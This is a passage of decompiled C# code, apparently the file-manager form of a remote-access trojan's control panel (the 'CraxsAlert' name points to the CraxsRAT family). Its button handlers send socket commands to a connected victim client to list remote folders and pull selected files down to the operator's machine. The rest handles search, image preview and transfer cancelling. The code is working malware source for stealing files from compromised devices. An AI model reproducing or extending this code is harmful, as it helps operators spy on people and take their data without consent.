	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA + "get2",
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}

	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				Operators.ConcatenateObject(SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA, Pback(Conversions.ToString(DGV0.Tag))),
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}

	private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				Operators.ConcatenateObject(SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA, DGV0.Tag),
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}

	private void DrakeUIButtonIcon6_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				string left = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[0].Tag);
				if (Operators.CompareString(left, "1", TextCompare: false) == 0)
				{
					string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value));
					if (classClient != null)
					{
						string[] array = classClient.Keys.Split(':');
						object[] parametersObjects = new object[4]
						{
							Client,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "download" + Data.SPL_DATA + array[0] + Data.SPL_DATA + array[1] + Data.SPL_DATA + text + Data.SPL_DATA + SecurityKey.down_info + "File" + classClient.UUID + Data.SPL_DATA + SecurityKey.downByte + "File" + classClient.UUID + Data.SPL_DATA + "File" + classClient.UUID,
							Codes.Encoding().GetBytes("null"),
							classClient
						};
						classClient.SendMessage(parametersObjects);
					}
				}
			}
		}
	}

	private void DrakeUIButtonIcon7_Click(object sender, EventArgs e)
	{
		if (viwimage.Image != null)
		{
			Bitmap bitmap = new Bitmap(viwimage.Image);
			bitmap.RotateFlip(RotateFlipType.Rotate90FlipNone);
			viwimage.Image = bitmap;
		}
	}

	private void DrakeUIButtonIcon8_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			string text = classClient.FolderUSER + "\\Downloads";
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			Process.Start(text);
		}
	}

	private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
	{
		try
		{
			if (DGVDATA.SelectedRows.Count <= 0)
			{
				return;
			}
			foreach (DataGridViewRow selectedRow in DGVDATA.SelectedRows)
			{
				if (selectedRow.Tag.ToString().Length > 1)
				{
					selectedRow.Tag = "X";
					selectedRow.Cells[4].Value = "Cancelled..";
					selectedRow.DefaultCellStyle.ForeColor = Color.Red;
					selectedRow.Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Clearsrchbtn_Click(object sender, EventArgs e)
	{
		searchtext.Text = "";
	}

	private void Searchtext_TextChanged(object sender, EventArgs e)
	{
		searchbefore.Clear();
		if (!string.IsNullOrEmpty(searchtext.Text))
		{
			clearsrchbtn.Visible = true;
		}
		else
		{
			clearsrchbtn.Visible = false;
		}
	}

	private void Searchbtn_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count < 1)
		{
			CraxsAlert.Showinformation("No Data Found");
			return;
		}
		if (string.IsNullOrEmpty(searchtext.Text))
		{
			CraxsAlert.Showinformation("Enter Text to search First");
			return;
		}
		bool flag = true;
		checked
		{
			int num = DGV0.Rows.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					DataGridViewRow dataGridViewRow = DGV0.Rows[i];
					if (!searchbefore.Contains(dataGridViewRow))
					{
						flag = false;
						if (dataGridViewRow.Cells[1].Value.ToString().ToLower().Contains(searchtext.Text.ToLower()) | dataGridViewRow.Cells[2].Value.ToString().ToLower().Contains(searchtext.Text.ToLower()) | dataGridViewRow.Cells[3].Value.ToString().ToLower().Contains(searchtext.Text.ToLower()) | dataGridViewRow.Cells[4].Value.ToString().ToLower().Contains(searchtext.Text.ToLower()) | dataGridViewRow.Cells[5].Value.ToString().Contains(searchtext.Text.ToLower()))
						{
							DGV0.ClearSelection();
							DGV0.FirstDisplayedScrollingRowIndex = i;
							dataGridViewRow.Selected = true;
							searchbefore.Add(dataGridViewRow);
							break;
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (flag)
			{
				CraxsAlert.Showinformation("No Result Found");
			}
		}
	}

	private void ClearButton_Click_1(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				if (DGVDATA.Rows.Count <= 0)
				{
					return;
				}
				int num = DGVDATA.Rows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					try
					{
						DataGridViewRow dataGridViewRow = DGVDATA.Rows[i];
						if (!Conversions.ToBoolean(Operators.OrObject(Operators.OrObject(Operators.OrObject(dataGridViewRow.Tag == null, Operators.CompareObjectEqual(dataGridViewRow.Tag, "f", TextCompare: false)), Operators.CompareObjectEqual(dataGridViewRow.Tag, "x", TextCompare: false)), Operators.CompareObjectEqual(dataGridViewRow.Tag, "X", TextCompare: false))))
						{
							continue;
						}
						try
						{
							string key = dataGridViewRow.Cells[0].Value.ToString();
							object objectValue = RuntimeHelpers.GetObjectValue(reso.GETKEY(key, DownStreams));
							FileStream fileStream = (FileStream)NewLateBinding.LateIndexGet(objectValue, new object[1] { 0 }, null);
							if (fileStream != null)
							{
								fileStream.Dispose();
								fileStream.Close();
								fileStream = null;
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						DGVDATA.Rows.RemoveAt(dataGridViewRow.Index);
						Downloadnum.Text = DGVDATA.Rows.Count.ToString();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}
}
